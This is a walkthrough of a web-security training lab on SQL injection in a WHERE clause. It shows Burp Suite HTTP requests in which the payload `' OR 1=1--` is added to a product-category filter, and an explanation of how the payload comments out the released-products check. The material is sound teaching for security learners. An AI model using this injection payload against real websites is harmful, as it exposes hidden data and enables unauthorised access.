The following is a solution to the lab titled "Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data".

Access the lab. From the Home page, navigate to one of the shop categories. (For this solution, the category is Accessories.)

In Burp Suite, send the request for the Accessories page to Repeater. The following is the unmodified HTTP request.

~~~
GET /filter?category=Accessories HTTP/2
Host: 0a3500a3042b2b11843a3897008800fd.web-security-academy.net
Cookie: session=egxqjkOekRr7s2wQXkObFabdTrnv1fCi
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/111.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://0a3500a3042b2b11843a3897008800fd.web-security-academy.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
~~~

Modify the HTTP request, adding `'+OR+1=1--` after `category=Accessories`. The following is the modified HTTP request.

~~~
GET /filter?category=Accessories'+OR+1=1-- HTTP/2
Host: 0a3500a3042b2b11843a3897008800fd.web-security-academy.net
Cookie: session=egxqjkOekRr7s2wQXkObFabdTrnv1fCi
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/111.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://0a3500a3042b2b11843a3897008800fd.web-security-academy.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
~~~

As a result of this modification, all product information was returned, thus solving the lab.

---

*SQL Note*

The unmodified request (`GET /filter?category=Accessories`) results in the following SQL query:

~~~
SELECT * FROM products WHERE category = 'Accessories' AND released = 1
~~~

This returns products from the category Accessories that have been released (`released = 1`).

Adding the payload `'+OR+1=1--` to `/filter?category=Accessories` results in the following SQL query:

~~~
SELECT * FROM products WHERE category = 'Accessories' OR 1=1--' AND released = 1
~~~

This query grabs products in the category Accessories or where 1=1. One is always equal to one, so this query grabs all products. The addition of -- turns the rest of the line into a comment, so ` AND released = 1` is ignored.
